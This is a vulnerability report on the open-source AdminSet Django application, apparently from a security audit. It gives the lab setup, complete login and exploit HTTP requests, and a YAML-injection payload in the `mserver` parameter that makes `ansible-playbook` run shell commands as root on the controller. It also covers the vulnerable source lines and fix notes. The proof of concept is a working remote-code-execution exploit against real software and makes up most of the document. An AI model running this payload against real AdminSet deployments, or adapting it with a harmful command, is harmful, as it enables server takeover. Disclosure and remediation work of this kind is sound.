### Vulnerability details

**Official website / Product:** https://github.com/guohongze/adminset

**Repository:** guohongze/adminset (stars at selection: 3456)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** commit 6c122c2824e6553b09ebd16a1fa05a593198c5ec (current default-branch HEAD; README claims Django 4.2.20 / Python 3.12)

**Vulnerability URL / Parameter:** `POST /setup/playbook/` parameter `mserver` (multi-value); with `mroles` to enter the roles execution branch

**Complex:** yes

### Verification procedure

1. Start the Docker lab. Original dir `labs/adminset-r67-a3/` and image `adminset-r67a3:lab` were removed after the audit (`lab_images_removed` in `logs/merged/r67-a3.json`). Rebuild an equivalent stack from the same commit to reproduce:
   - Source: `guohongze/adminset` @ `6c122c2824e6553b09ebd16a1fa05a593198c5ec`
   - Stack: `python:3.12-slim-bookworm` web (Django + `ansible`/`ansible-playbook` installed) + `redis:7-alpine`, SQLite for the app DB
   - Ports: host **24703 → container 8000**; observed container names `adminset-r67a3-web` / `adminset-r67a3-redis`
   - Creds: superuser **`admin` / `admin`**
   - Lab entrypoint applies Python 3 text-mode compatibility for legacy `wb+`/`ab+` log writers; it does **not** change the `mserver` → `gexec.yml` YAML-injection sink
   - After `docker compose up -d`, topology was:

```text
NAME                   IMAGE                COMMAND                  SERVICE   STATUS         PORTS
adminset-r67a3-redis   redis:7-alpine       "docker-entrypoint.s…"   redis     Up             6379/tcp
adminset-r67a3-web     adminset-r67a3:lab   "bash /lab/conf/entr…"   web       Up             0.0.0.0:24703->8000/tcp, [::]:24703->8000/tcp
```

2. Authenticate (endpoint requires `@login_required` + `permission_verify`): `GET /accounts/login/` for the `csrftoken` cookie, then `POST /accounts/login/` with `username`/`password`/`csrfmiddlewaretoken`/`next`, and take `sessionid` (and refreshed `csrftoken`) from `Set-Cookie`. Cookies in the PoC below are lab-captured — replace them with a fresh login session when reproducing.
3. `POST /setup/playbook/` with an `mserver` value containing newlines and Ansible YAML fields (`connection: local` + `tasks:`/`shell:`), plus any `mroles` (e.g. `common`) so `setup/tasks.py` takes the roles branch (`if host:` ∧ `if roles:`). Even if the named role is missing, the injected `shell` task still runs first on the controller.
4. The server concatenates the attacker string into `/var/opt/adminset/data/ansible/gexec.yml` and synchronously runs `ansible-playbook` (`Popen(..., shell=True)`), executing shell on the AdminSet controller as the app user (root in the lab).
5. Confirm inside the container:

```bash
docker exec adminset-r67a3-web cat /tmp/adminset_yaml_rce
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Complete vulnerability PoC

#### 0) Authenticate (Django form login)

```http
GET /accounts/login/ HTTP/1.1
Host: 127.0.0.1:24703
Accept: text/html
Connection: close
```

Take CSRF from `Set-Cookie: csrftoken=...` / the login form hidden field, then:

```http
POST /accounts/login/ HTTP/1.1
Host: 127.0.0.1:24703
Content-Type: application/x-www-form-urlencoded
Cookie: csrftoken=<csrf_from_get>
Content-Length: 97
Connection: close

csrfmiddlewaretoken=<csrf_from_get>&username=admin&password=admin&next=/
```

Expected: `302` to `/`, `Set-Cookie: sessionid=...` (and possibly a refreshed `csrftoken`). Subsequent requests must send both cookies; the POST body `csrfmiddlewaretoken` must match the `csrftoken` cookie.

#### 1) Trigger: YAML-injected playbook execution

URL-decoded `mserver` value (newline injection):

```text
localhost
  connection: local
  gather_facts: false
  tasks:
    - shell: id > /tmp/adminset_yaml_rce
```

Complete HTTP request (Docker-verified):

```http
POST /setup/playbook/ HTTP/1.1
Host: 127.0.0.1:24703
User-Agent: adminset-r67-a3-poc/1.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:24703
Referer: http://127.0.0.1:24703/setup/ansible/
Cookie: sessionid=mx6grmpm48iab4ipcdvixwx548z00bvl; csrftoken=93HUgOUoEPhStGHu8hO0BDMXENQQgc7t
Content-Length: 198
Connection: close

csrfmiddlewaretoken=93HUgOUoEPhStGHu8hO0BDMXENQQgc7t&mserver=localhost%0A++connection%3A+local%0A++gather_facts%3A+false%0A++tasks%3A%0A++++-+shell%3A+id+%3E+%2Ftmp%2Fadminset_yaml_rce&mroles=common
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 18:12:41 GMT
Server: WSGIServer/0.2 CPython/3.12.16
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

ok
```

Verification result: HTTP 200 with body `ok`. File `/tmp/adminset_yaml_rce` contains:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Generated `/var/opt/adminset/data/ansible/gexec.yml` (injection visible; trailing `remote_user`/`roles` still appended):

```yaml
- hosts: localhost
  connection: local
  gather_facts: false
  tasks:
    - shell: id > /tmp/adminset_yaml_rce
  remote_user: root
  gather_facts: true
  roles:
    - common
```

Re-check the injected playbook inside the container with:

```bash
docker exec adminset-r67a3-web cat /var/opt/adminset/data/ansible/gexec.yml
```

### Vulnerability analysis

`setup/ansible.py` `playbook` reads `mserver`/`mroles` from POST and calls `ansible_task` synchronously. In the roles branch, `setup/tasks.py` builds Ansible YAML with `'- hosts: '+h+'\n'` using the raw POST value — **no** allowlist against CMDB inventory and no newline escaping. An attacker injects extra YAML keys (`connection: local`, `tasks`) so `ansible-playbook` runs arbitrary shell on the AdminSet controller. This bypasses the intended “pick existing host + role from UI” model.

Trigger / sink source (full path and line numbers):

```python
# File: setup/ansible.py
# Lines: 61-69
        host = request.POST.getlist('mserver', [])
        group = request.POST.getlist('mgroup', [])
        pbook = request.POST.getlist('splaybook', [])
        roles = request.POST.getlist('mroles', [])
        role_vars = request.POST.get('mvars')
        res = GetRedis.connect()
        res.set("ansible_{0}".format(request.user.username), 1)
        ansible_task(request, host, group, pbook, roles, role_vars, write_role_vars)
```

```python
# File: setup/tasks.py
# Lines: 48-58 (upstream HEAD)
            for h in host:
                # wirte ansible-play yaml file
                with open(ansible_dir + '/gexec.yml', 'w+') as f:
                    flist = ['- hosts: '+h+'\n', '  remote_user: root\n', '  gather_facts: true\n', '  roles:\n']
                    for r in roles:
                        rs = '    - ' + r + '\n'
                        flist.append(rs)
                        logging.info("Role:"+r)
                    f.writelines(flist)
                cmd = "ansible-playbook"+" " + ansible_dir+'/gexec.yml'
                p = Popen(cmd, stderr=PIPE, stdout=PIPE, shell=True)
```

### Fix notes

1. Validate `mserver`/`mgroup` against CMDB inventory only; reject whitespace/newlines/YAML metacharacters.  
2. Emit playbooks via a safe YAML serializer — never string-concatenate user input.  
3. Disallow implicit controller `connection: local` task injection; separate inventory privileges.  
4. Invoke `ansible-playbook` with an argument list (`shell=False`).
